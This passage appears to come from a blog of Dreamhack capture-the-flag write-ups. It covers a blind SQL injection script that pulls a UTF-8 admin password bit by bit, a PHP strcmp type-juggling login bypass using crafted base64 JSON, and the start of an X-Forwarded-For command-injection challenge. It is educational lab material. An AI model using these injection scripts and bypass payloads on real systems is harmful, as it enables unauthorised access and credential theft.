exists.&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&#123;% endif %&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    uid = request.args.get(<span class="string">&#x27;uid&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    nrows = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> uid:</span><br><span class="line">        cur = mysql.connection.cursor()</span><br><span class="line">        nrows = cur.execute(<span class="string">f&quot;SELECT * FROM users WHERE uid=&#x27;<span class="subst">&#123;uid&#125;</span>&#x27;;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, uid=uid, nrows=nrows)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>when user input uid like admin、guest、test, these user is exists</p>
<p><a target="_blank" rel="noopener" href="http://host3.dreamhack.games:13635/?uid=test">http://host3.dreamhack.games:13635/?uid=test</a></p>
<p><img src="/img/Dreamhack1_36.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_37.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_38.png" alt="Untitled"></p>
<p>we can notice here</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSERT INTO users (uid, upw) values (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;DH&#123;**FLAG**&#125;&#x27;</span>);</span><br><span class="line">INSERT INTO users (uid, upw) values (<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line">INSERT INTO users (uid, upw) values (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>when uid is admin then upw will output the flag</p>
<p><code>**uid</code>** Maximum length is 128 characters. It represents the user’s account name</p>
<p><strong><code>upw</code> The maximum length is also 128 characters. It represents the user’s password</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">uid varchar(<span class="number">128</span>) <span class="keyword">not</span> null</span><br><span class="line">upw varchar(<span class="number">128</span>) <span class="keyword">not</span> null</span><br></pre></td></tr></table></figure>

<p>The definition of “varchar(128)” refers to the maximum number of characters that this field can hold, which is 128, rather than the number of bits. In other words, this field can store up to <code>128 characters</code>, regardless of the specific encoding of those characters or the number of bits they occupy.</p>
<p>According to the title</p>
<p><code>The administrator password consists of &quot;ASCII code&quot; and &quot;Korean&quot;.</code></p>
<p>we are not sure which combination the password is. It may be both. </p>
<p>To determine, you need to find out the length of each character when expressed as a bit string.</p>
<ul>
<li>ASCII → 1 byte (&#x3D;8 bits)</li>
<li>Korean → 3 bytes per character (&#x3D;24 bits)</li>
</ul>
<p>Summarize what needs to be done</p>
<ul>
<li>Find the administrator password length<ul>
<li>Attempts to determine the password length of the administrator account by sending a corresponding request</li>
</ul>
</li>
<li>Extract the bit string of each character<ul>
<li>Extracts the bit string for each character in the password based on <code>UTF-8 encoding</code>.</li>
</ul>
</li>
<li>Convert bit strings to characters<ul>
<li>Convert bit strings to corresponding characters for subsequent comparison and analysis.</li>
<li>In order to present the data in a more readable form</li>
<li>Bit strings represent binary data. Converting them to characters can present these data in readable character form</li>
</ul>
</li>
<li>Convert bit string to integer<ul>
<li>Converts a bit string to an integer and to a character in Big Endian format.</li>
<li>To convert binary data represented by bit strings into integer form for numerical comparison or other calculations</li>
</ul>
</li>
<li>Convert to <code>Big Endian</code> format characters<ul>
<li>Big Endian is a byte order (byte order) representation in which higher-order bytes are stored at lower addresses</li>
<li>When representing numerical values, especially in cross-platform or network communication, the data needs to be expressed in a unified byte order to ensure the accuracy and consistency of the data</li>
<li>When converting a bit string to an integer, it may be necessary to represent it in Big Endian format so that the data can be accurately interpreted and compared between different systems</li>
</ul>
</li>
<li>Convert to matching encoding<ul>
<li>Make sure that the converted characters use the correct character encoding and confirm the correctness of the conversion by verifying the representation and content of the characters</li>
</ul>
</li>
</ul>
<p>Exploit:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> get</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#INSERT INTO users (uid, upw) values (&#x27;admin&#x27;, &#x27;DH&#123;**FLAG**&#125;&#x27;);</span></span><br><span class="line"><span class="comment">#SELECT * FROM users WHERE uid=&#x27;&#123;uid&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_password_length</span>(<span class="params">url</span>):</span><br><span class="line">    password_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        password_length += <span class="number">1</span></span><br><span class="line">        qry = <span class="string">f&quot;admin&#x27; AND CHAR_LENGTH(upw) = <span class="subst">&#123;password_length&#125;</span>-- &quot;</span></span><br><span class="line">        r = get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?uid=<span class="subst">&#123;qry&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> r.text:<span class="comment">#If the returned content contains the &quot;exists&quot; string, it means that the assumed password length is correct.</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> password_length</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">This find_password_length func works by sending an HTTP request, including snippets of a SQL query, and then observing what is returned by the web page. If the SQL query returns results that contain expected results, such as the &quot;exists&quot; string, the content returned by the web page will be different. Based on this difference, the program can determine whether certain conditions are true and then infer some hidden information, such as the length of the password or the bit string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_char_bitstream_length</span>(<span class="params">url, position</span>):</span><br><span class="line">    bit_length = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        bit_length += <span class="number">1</span></span><br><span class="line">        qry = <span class="string">f&quot;admin&#x27; AND LENGTH(BIN(ORD(SUBSTRING(upw, <span class="subst">&#123;position&#125;</span>, 1)))) = <span class="subst">&#123;bit_length&#125;</span>-- &quot;</span></span><br><span class="line">        r = get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?uid=<span class="subst">&#123;qry&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> bit_length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_char_bitstream</span>(<span class="params">url, position, bit_length</span>):</span><br><span class="line">    bits = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, bit_length + <span class="number">1</span>):</span><br><span class="line">        qry = <span class="string">f&quot;admin&#x27; AND SUBSTRING(BIN(ORD(SUBSTRING(upw, <span class="subst">&#123;position&#125;</span>, 1))), <span class="subst">&#123;j&#125;</span>, 1) = &#x27;1&#x27;-- &quot;</span></span><br><span class="line">        r = get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/?uid=<span class="subst">&#123;qry&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            bits += <span class="string">&quot;1&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            bits += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_bitstream</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%x&#x27;</span> % <span class="built_in">int</span>(bits, <span class="number">2</span>)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">&quot;http://host3.dreamhack.games:19732/&quot;</span></span><br><span class="line">    password_length = find_password_length(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Password Length is <span class="subst">&#123;password_length&#125;</span> (bits)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length + <span class="number">1</span>):</span><br><span class="line">        bit_length = find_char_bitstream_length(url, i)</span><br><span class="line">        bits = find_char_bitstream(url, i, bit_length)</span><br><span class="line">        password += decode_bitstream(bits)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> - <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Finally Password is &gt;&gt; <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Password Length <span class="keyword">is</span> <span class="number">13</span> (bits)</span><br><span class="line"><span class="number">1</span> - D</span><br><span class="line"><span class="number">2</span> - DH</span><br><span class="line"><span class="number">3</span> - DH&#123;</span><br><span class="line"><span class="number">4</span> - DH&#123;이</span><br><span class="line"><span class="number">5</span> - DH&#123;이것</span><br><span class="line"><span class="number">6</span> - DH&#123;이것이</span><br><span class="line"><span class="number">7</span> - DH&#123;이것이비</span><br><span class="line"><span class="number">8</span> - DH&#123;이것이비밀</span><br><span class="line"><span class="number">9</span> - DH&#123;이것이비밀번</span><br><span class="line"><span class="number">10</span> - DH&#123;이것이비밀번호</span><br><span class="line"><span class="number">11</span> - DH&#123;이것이비밀번호!</span><br><span class="line"><span class="number">12</span> - DH&#123;이것이비밀번호!?</span><br><span class="line"><span class="number">13</span> - DH&#123;이것이비밀번호!?&#125;</span><br><span class="line">Finally Password <span class="keyword">is</span> &gt;&gt; DH&#123;이것이비밀번호!?&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>admin&#39; AND ...</code></strong><ul>
<li>Filter the data in the target database to ensure that we only check data in the target database that meets certain criteria</li>
</ul>
</li>
<li><strong><code>SUBSTRING(upw, &#123;position&#125;, 1)</code></strong><ul>
<li><strong>Extracts a character</strong> at a specific position ({position}) from the upw field</li>
</ul>
</li>
<li><strong><code>ORD(SUBSTRING(...))</code></strong><ul>
<li>Converts the <strong>extracted characters</strong> into their corresponding <code>ASCII encoded</code> values</li>
</ul>
</li>
<li><strong><code>BIN(ORD(...))</code></strong><ul>
<li>Converts an ASCII encoded value to a <code>binary</code> representation of a bit string</li>
</ul>
</li>
<li><strong><code>SUBSTRING(BIN(...), &#123;j&#125;, 1)</code></strong><ul>
<li>Extracts a bit at a specific position ({j}) from a bit string</li>
</ul>
</li>
</ul>
<hr>
<h3 id="easy-login"><a href="#easy-login" class="headerlink" title="easy-login"></a><strong>easy-login</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>관리자로 로그인하여 플래그를 획득하세요!</strong></p>
<p><strong>플래그 형식은 <code>DH&#123;...&#125;</code> 입니다.</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;redir&quot;</span> action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$a</span>[<span class="variable">$k</span>] = <span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$j</span> = <span class="title function_ invoke__">json_encode</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;cred&quot; value=&quot;&#x27;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$j</span>) . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;redir&#x27;</span>).<span class="title function_ invoke__">submit</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>This piece of PHP handles the collection and processing of user-submitted information. It uses <strong>foreach</strong> to loop through all key-value pairs in <strong>$_POST</strong> and stores them in an associative array <strong>$a</strong>. Then, it uses the <strong>json_encode()</strong> function to convert the entire array into a JSON-formatted string, and Base64-encodes the JSON string.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePassword</span>(<span class="params"><span class="variable">$length</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdef&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$pw</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$pw</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$pw</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateOTP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;P&#x27;</span> . <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="number">999999</span>)), <span class="number">6</span>, <span class="string">&quot;0&quot;</span>, STR_PAD_LEFT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$admin_pw</span> = <span class="title function_ invoke__">generatePassword</span>(<span class="number">32</span>);</span><br><span class="line"><span class="variable">$otp</span> = <span class="title function_ invoke__">generateOTP</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cred&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please login...&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$cred</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cred&#x27;</span>]))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cred error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="variable">$cred</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$cred</span>, <span class="literal">true</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cred error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">isset</span>(<span class="variable">$cred</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$cred</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$cred</span>[<span class="string">&#x27;otp&#x27;</span>]))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Cred error&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cred</span>[<span class="string">&#x27;id&#x27;</span>] != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello,&quot;</span> . <span class="variable">$cred</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cred</span>[<span class="string">&#x27;otp&#x27;</span>] != <span class="variable">$GLOBALS</span>[<span class="string">&#x27;otp&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OTP fail&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$cred</span>[<span class="string">&#x27;pw&#x27;</span>], <span class="variable">$GLOBALS</span>[<span class="string">&#x27;admin_pw&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, admin! get the flag: &quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Password fail&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Easy Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>-<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;<span class="title">Login</span> <span class="title">as</span> <span class="title">admin</span> <span class="title">to</span> <span class="title">get</span> <span class="title">flag</span>&lt;<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">action</span>=&quot;<span class="title">login</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">id</span>&quot;&gt;<span class="title">ID</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">id</span>&quot;&gt;&lt;/<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">pw</span>&quot;&gt;<span class="title">PW</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">pw</span>&quot;&gt;&lt;/<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">otp</span>&quot;&gt;<span class="title">OTP</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">otp</span>&quot;&gt;&lt;/<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">login</span>(); ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_39.png" alt="Untitled"></p>
<p>Login requires three values: <code>ID</code>, <code>PW</code> (password) and <code>OTP</code>. For ordinary users, we only need to know the admin’s ID and provide the correct OTP to log in</p>
<p>The program uses two functions <strong>generatePassword()</strong> and <strong>generateOTP()</strong> to generate the admin password and OTP. The password is a 32-character hexadecimal string, while the OTP is ‘P’ followed by a six-digit string. These values ​​are regenerated on every page load, so we need to attack on the same page load.</p>
<p>The <strong><code>login()</code></strong> function performs the actual login check. It first checks if <strong><code>cred</code></strong> is provided, then decodes and parses the value to check if the provided ID, PW and OTP are correct. If the ID is admin, the OTP provided is correct, and the PW provided matches the password of admin, the flag will be displayed.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$cred</span>[<span class="string">&#x27;pw&#x27;</span>], <span class="variable">$GLOBALS</span>[<span class="string">&#x27;admin_pw&#x27;</span>])) &#123;</span><br><span class="line">     <span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Hello, admin! get the flag: &quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>strcmp() Function compares two strings, case sensitive</p>
<p>This function returns:</p>
<ul>
<li>0 - if the two strings are equal</li>
<li>&lt;0 - if string1 is less than string2</li>
<li><blockquote>
<p>0 - if string1 is greater than string2</p>
</blockquote>
</li>
</ul>
<p><code>$_POST[&#39;cred&#39;]</code> If set equal to an empty array, strcmp will return NULL. Some inherent weaknesses in PHP comparisons, NULL &#x3D;&#x3D; 0 will return true</p>
<p><strong><code>$_POST[&#39;cred&#39;]</code></strong> Contains all submitted form information</p>
<p>So, by reshaping the screen and intercepting</p>
<p><img src="/img/Dreamhack1_40.png" alt="Untitled"></p>
<p>The content to be given to cred needs to be converted through base64</p>
<p><code>&#123;&quot;id&quot;:&quot;admin&quot;,&quot;pw&quot;:[],&quot;otp&quot;:true&#125;</code> &gt; <code>eyJpZCI6ImFkbWluIiwicHciOltdLCJvdHAiOnRydWV9</code></p>
<p>or </p>
<p><code>&#123;&quot;id&quot;:&quot;admin&quot;,&quot;pw&quot;:[],&quot;otp&quot;:0&#125;</code> &gt; <code>eyJpZCI6ImFkbWluIiwicHciOltdLCJvdHAiOjB9</code></p>
<p><img src="/img/Dreamhack1_41.png" alt="Untitled"></p>
<p>Replace the value of cred</p>
<p><img src="/img/Dreamhack1_42.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_43.png" alt="Untitled"></p>
<p>or write a code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests,json,base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://host3.dreamhack.games:24086/&#x27;</span></span><br><span class="line">packet = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pw&quot;</span>: [],</span><br><span class="line">    <span class="string">&quot;otp&quot;</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;cred&#x27;</span> : base64.<span class="title function_ invoke__">b64encode</span>(json.<span class="title function_ invoke__">dumps</span>(packet).<span class="title function_ invoke__">encode</span>()).<span class="title function_ invoke__">decode</span>()&#125;</span><br><span class="line">flag = requests.<span class="title function_ invoke__">post</span>(url, data)</span><br><span class="line"><span class="keyword">print</span>(flag.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/Dreamhack1_44.png" alt="Untitled"></p>
<hr>
<h3 id="what-is-my-ip"><a href="#what-is-my-ip" class="headerlink" title="what-is-my-ip"></a><strong>what-is-my-ip</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>How are they aware of us even behind the wall?</strong></p>
<ul>
<li><strong>FYI</strong></li>
</ul>
<p><strong>Flag Location: <code>/flag</code></strong></p>
<p>Flag Format: <code>DH&#123;...&#125;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> run, TimeoutExpired</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = os.urandom(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user_ip = request.access_route[<span class="number">0</span>] <span class="keyword">if</span> request.access_route <span class="keyword">else</span> request.remote_addr</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = run(</span><br><span class="line">            [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">f&quot;echo <span class="subst">&#123;user_ip&#125;</span>&quot;</span>],</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span>,</span><br><span class="line">            timeout=<span class="number">3</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, result=result.stdout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> TimeoutExpired:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, result=<span class="string">&quot;Timeout!&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">3000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>When you open the page, you can pay attention to</p>
<p><img src="/img/Dreamhack1_45.png" alt="Untitled"></p>
<p>This section of the code gets the IP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user_ip = **request.access_route[<span class="number">0</span>] <span class="keyword">if</span> request.access_route <span class="keyword">else</span> request.remote_addr**</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>request.access_route[0]</code> represents the first IP address before passing through the proxy</strong></li>
<li><strong><code>request.access_route</code></strong> is a Flask-specific property used to access the list of IP addresses in the path passed by the user request</li>
<li>If the user’s request goes through a proxy, this list will include all IP addresses before the proxy</li>
<li>The proxy will put the user’s original IP address in the <strong><code>X-Forwarded-For</code></strong> of the HTTP header. This header may contain one or more IP addresses, each IP address represents an agent passed through</li>
